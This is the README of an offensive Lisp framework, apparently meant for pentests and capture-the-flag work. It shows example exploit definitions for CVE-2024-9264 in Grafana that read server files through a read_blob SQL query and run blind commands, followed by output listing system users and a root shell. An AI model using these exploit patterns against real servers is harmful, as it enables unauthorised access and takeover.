# Grimoire

<p align="center">
  <img src="https://github.com/user-attachments/assets/127f9116-e1d9-4ccc-9c22-ee17c3afda75"/>
</p>

<p align="center">
  A collection of utilities designed to facilitate reconnaissance, exploitation, persistence, and privilege escalation (only for educational purposes).
</p>

## Installation

To use Grimoire, clone the repository to your local machine.

```bash
$ git clone https://github.com/solanav/grimoire
```

After that, launch your common lisp environment (be it Lem, Emacs or any other IDE) and load Grimoire with:

```lisp
CL-USER> (ql:quickload :grimoire)
```
    
You should then enter the package and start working on the system itself, rather than using it from another package:
    
```lisp
CL-USER> (in-package :grimoire)
```
    
## Concepts

- **Glyphs**: Created using `define-glyph`. They expose some type of operation to the framework such as reading files (:SIGHT) , code execution (:COMMAND), blind code execution (:SIGHTLESS-COMMAND), file uploads (:MARK), etc.

- **Spells**: Created using `define-spell`. They use the glyphs available to do interesting or useful operations on the objective. For example, the spell `download-all` allows the user to download all files in a given remote path if the glyph :COMMAND is available to Grimoire.
    
- **Transmutations**: Created using `define-transmutation`. They allow Grimoire to derive new glyphs from already implemented ones. For example, if you have both the :SIGHT and :SIGHTLESS-COMMAND glyphs, you will be able to derive the :COMMAND through a transmutation.
    
- **Relics**: Managed through the functions starting with `relic/*`. A basic and global key-value store.

## Usage

Once you have Grimoire loaded, you can start using its utilities. First you should find an entry point to the system you are trying to exploit.

If you find a way of reading files in the remote server for example, you can create a function called `CVE-2024-9264` that reads files from the remote server:

```lisp
(define-glyph :sight CVE-2024-9264 (file)
  (let* ((text (str:replace-all
                "\\x0A" (fmt "~%")
                (send-request-to-vulnerable-server
                 (fmt "SELECT content FROM read_blob(\"~a\")"
                      file))))
         (text-len (1- (length text))))
    (if (plusp text-len)
        (subseq text 0 text-len)
        "")))
```

Grimoire now unlocks a bunch of spells that you can use to progress further, for example:

```lisp
GRIMOIRE> (all-users)
("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail"
 "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats"
 "nobody" "_apt" "grafana")

GRIMOIRE> (system-info)
(("PRETTY_NAME" . "Ubuntu 22.04.4 LTS")
 ("NAME" . "Ubuntu") 
 ("VERSION_ID" . "22.04")
 ("VERSION" . "22.04.4 LTS (Jammy Jellyfish)")
 ("VERSION_CODENAME" . "jammy") 
 ("ID" . "ubuntu")
 ("ID_LIKE" . "debian")
 ("HOME_URL" . "https://www.ubuntu.com/")
 ("SUPPORT_URL" . "https://help.ubuntu.com/")
 ("BUG_REPORT_URL" . "https://bugs.launchpad.net/ubuntu/")
 ("PRIVACY_POLICY_URL" . "https://.../privacy-policy")
 ("UBUNTU_CODENAME" . "jammy"))
```
    
If you now create another glyph to do blind execution of code:

```lisp
(define-glyph :sightless-command CVE-2024-9264 (command)
  (send-request-to-vulnerable-server
   (fmt *exploit* command)))
```
    
So now if we check our current glyphs:
```lisp
GRIMOIRE> (glyph/info)
[+] Glyph "SIGHT"
    Provided by "#<FUNCTION SIGHT/CVE-2024-9264>"

[+] Glyph "SIGHTLESS-COMMAND"
    Provided by "#<FUNCTION SIGHTLESS-COMMAND/CVE-2024-9264>"
```
    
Now we should check if we have any interesting transmutations to expand our glyphs.

Running `transmutation/info` will yield:
```lisp
GRIMOIRE> (transmutation/info)
[+] Transmutation "CAT"
    Runnable? [NO] (needs :COMMAND)
    Needed?   [NO] (provides :SIGHT)

[+] Transmutation "LET-THERE-BE-LIGHT"
    Runnable? [YES] (needs :SIGHT, :SIGHTLESS-COMMAND)
    Needed?   [YES] (provides :COMMAND)
```
    
So lets run the first transmutation in the REPL:
```lisp
GRIMOIRE> (transmutation/run :let-there-be-light)
[+] Added new glyph: :COMMAND
```

So lets test it with the `fake-shell` spell:
```lisp
GRIMOIRE> (fake-shell)
[/usr/share/grafana]$ ls
LICENSE
bin
conf
public

[/usr/share/grafana]$ whoami
root

[/usr/share/grafana]$ exit
```
    
You can always run `(info)` to see the state of the system:
```lisp
================== ~* SPELLS ~* ==================

[+] Spell "SYSTEM-INFO"
    Description: "read system information"
    Castable? [YES] (needs :SIGHT)

[+] Spell "ALL-USERS"
    Description: "list all the users from /etc/passwd"
    Castable? [YES] (needs :SIGHT)

[+] Spell "USERS"
    Description: "list the users that are not default"
    Castable? [YES] (needs :SIGHT)

[+] Spell "FLAG"
    Description: "try to read the flag from user home folders"
    Castable? [YES] (needs :SIGHT)

============== ~> TRANSMUTATIONS ~> ==============

[+] Transmutation "LET-THERE-BE-LIGHT"
    Possible? [YES] (needs :SIGHT, :SIGHTLESS-COMMAND)
    Needed?   [YES] (provides :COMMAND)

================== <> GLYPHS <> ==================

[+] Glyph "SIGHT"
    Provided by "#<FUNCTION SIGHT/CVE-2024-9264>"

[+] Glyph "SIGHTLESS-COMMAND"
    Provided by "#<FUNCTION SIGHTLESS-COMMAND/CVE-2024-9264>"

==================================================
```

## Roadmap

In no particular order:
    
- [ ] Add mark (write) utilities to Grimoire.
- [ ] Package Grimoire with Lem so it can be used as a standalone tool.
- [ ] Add an easy way to create POCs and export them so Grimoire can use them.
- [ ] Add a graph like representation of glyphs and how they can be chained together.
- [ ] Add a way to easily share glyphs with other users.
- [ ] Add logging.
- [ ] Add a way to easily create a report of the pentest.
- [ ] Add some testing of new glyphs and spells so we can even make transmutations automatic.
    
- [x] Add a deployable binary for persistance.
- [x] Add command (exec) utilities to Grimoire.
- [x] Add sight (read) utilities to Grimoire.
- [x] Add some kind of database to store relics and other stuff.

